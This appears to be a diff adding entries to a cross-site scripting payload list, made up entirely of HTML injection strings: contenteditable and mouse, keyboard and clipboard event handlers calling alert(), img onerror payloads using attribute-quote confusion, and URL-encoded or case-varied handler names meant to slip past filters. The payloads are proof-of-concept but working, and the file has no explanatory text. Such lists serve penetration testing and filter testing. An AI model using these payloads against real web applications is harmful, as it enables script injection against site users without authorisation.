@@ -1,0 +1,51 @@
+<x contenteditable onblur=alert(155)>lose focus!
+<x contenteditable onblur=alert(1)>lose focus! 
+<x contenteditable onfocus=alert(162)>focus this!
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(163)>input here!
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(164)>press any key!
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(165)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(166)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key! 
+<x contenteditable onpaste=alert(172)>paste here!
+<x contenteditable onpaste=alert(1)>paste here!
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1499)//'>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(585)//'>
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onclick=alert(156)>click this!
+<x onclick=alert(1)>click this! 
+<x oncontextmenu=alert(158)>right click this!
+<x oncontextmenu=alert(1)>right click this! 
+<x oncopy=alert(157)>copy this!
+<x oncopy=alert(1)>copy this! 
+<x oncut=alert(159)>copy this!
+<x oncut=alert(1)>copy this! 
+<x+oncut=y=prompt,y`1`>xss
+<x ondblclick=alert(160)>double click this!
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(161)>drag this!
+<x ondrag=alert(1)>drag this! 
+<x onmousedown=alert(167)>click this!
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(168)>hover this!
+<x onmousemove=alert(1)>hover this! 
+<x onmouseout=alert(169)>hover this!
+<x onmouseout=alert(1)>hover this! 
+<x onmouseover=alert(170)>hover this!
+<x onmouseover=alert(1)>hover this! 
+<x onmouseup=alert(171)>click this!
+<x onmouseup=alert(1)>click this! 
+<x </onxxx=1 
+<x/onxxx=1 
+<x OnXxx=1 
+<X onxxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x onxxx%3D1
+<x onxxx=alert(1) 1='
